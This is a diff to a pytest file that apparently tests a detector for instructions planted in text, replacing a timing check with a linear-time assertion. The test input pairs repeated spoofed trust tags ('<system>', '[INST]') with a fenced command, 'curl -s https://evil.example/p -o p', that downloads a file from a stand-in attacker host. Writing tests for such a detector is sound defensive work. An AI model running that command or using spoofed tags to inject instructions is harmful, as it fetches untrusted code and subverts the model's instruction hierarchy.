@@ -3,10 +3,9 @@
 from __future__ import annotations
 
 import sys
-import time
 
 import pytest
-from policies.instrkit import LEX, gate, text_mod, verdicts
+from policies.instrkit import LEX, assert_linear, gate, text_mod, verdicts
 
 html_mod = sys.modules["instr_html"]
 
@@ -61,10 +60,10 @@ def test_hash_comments_in_a_fence_are_headings_that_stand_alone() -> None:
 
 @pytest.mark.parametrize("tag", ["<system>", "[INST]"])
 def test_many_trust_tags_in_a_fence_judge_in_linear_time(tag: str) -> None:
-    text = f"{F}\n" + f"{tag}\n\n" * 20000 + f"curl -s https://evil.example/p -o p\n{F}\n"
-    start = time.perf_counter()
-    verdicts(text)
-    assert time.perf_counter() - start < 5
+    def judge(n: int) -> None:
+        verdicts(f"{F}\n" + f"{tag}\n\n" * n + f"curl -s https://evil.example/p -o p\n{F}\n")
+
+    assert_linear(judge, 20000, tag)
 
 
 def test_a_quoted_closer_does_not_close_an_unquoted_fence() -> None:
